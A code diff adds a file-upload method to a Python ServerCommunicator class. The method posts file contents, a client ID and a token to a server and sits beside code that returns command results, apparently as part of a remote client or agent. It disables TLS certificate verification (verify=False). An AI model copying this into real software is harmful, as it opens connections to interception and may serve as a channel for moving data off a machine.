@@ -433,6 +433,47 @@ class ServerCommunicator:
                 logging.error(f"Failed to send command result: {str(e)}")
             raise CommunicationError(f"Failed to send command result: {str(e)}")
 
+    def upload_file(self, file_data: Dict) -> Dict:
+        try:
+            if Config.DEBUG_MODE:
+                logging.info(f"Preparing file upload: client_id={self.client_id}, filename={file_data['filename']}")
+            
+            files = {
+                "file": (file_data["filename"], file_data["content"], "application/octet-stream")
+            }
+            data = {
+                "action": "upload_file",
+                "client_id": file_data["client_id"],
+                "token": self.token,
+                "timestamp": file_data["timestamp"]
+            }
+            
+            if Config.DEBUG_MODE:
+                logging.info(f"Sending file upload request: {data}")
+            
+            response = requests.post(
+                self.server_url,
+                data=data,
+                files=files,
+                timeout=Config.COMMAND_TIMEOUT,
+                verify=False,
+                proxies=self.proxies
+            )
+            
+            if response.status_code != 200:
+                if Config.DEBUG_MODE:
+                    logging.error(f"File upload failed: status={response.status_code}, response={response.text}")
+                raise CommunicationError(f"File upload failed: {response.text}")
+            
+            if Config.DEBUG_MODE:
+                logging.info(f"File uploaded successfully: {file_data['filename']}")
+            
+            return response.json()
+        
+        except Exception as e:
+            if Config.DEBUG_MODE:
+                logging.error(f"File upload error: {str(e)}")
+            raise CommunicationError(f"File upload error: {str(e)}")
 
 class CommunicationError(Exception):
     pass
